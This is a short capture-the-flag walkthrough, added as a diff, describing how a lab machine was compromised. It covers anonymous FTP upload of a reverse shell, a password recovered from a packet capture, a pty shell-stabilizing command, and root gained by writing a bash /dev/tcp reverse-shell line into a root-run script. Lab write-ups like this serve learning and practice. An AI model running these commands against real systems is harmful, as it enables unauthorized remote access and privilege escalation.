@@ -1,0 +1,7 @@
+Step 1 discover the running services on the machine using nmap and check website directories using gobuster
+
+Step 2 from the scan results we found an ftp server that allows anonymous login and a web directory called files where we uploaded a reverse shell through a directory which is writable by everyone on the ftp server and started it to get a connection.
+
+Step 3 in the machine, we found a suspicous.pcapng file in the incidents directory so we downloaded it and viewed it in wireshark. Using the data filter type, we followed the tcp stream to get lennie's credentials and login to ssh her password was "c4ntg3t3n0ughsp1c3". Note *** To stabilize a shell we use the command "python -c "import pty;pty.spawn('/bin/bash')""
+
+Step 4 in the home directory, I found a script file which runs /bin/bash as root and outputs the result into a text file. after using watch command, I came to know that the text file is updated every minute but its not showing in crontab. So, we modified the /etc/print.sh file with "/bin/bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'" and we got the root flag. Note*** Use pspy from github to monitor processes without root permissions
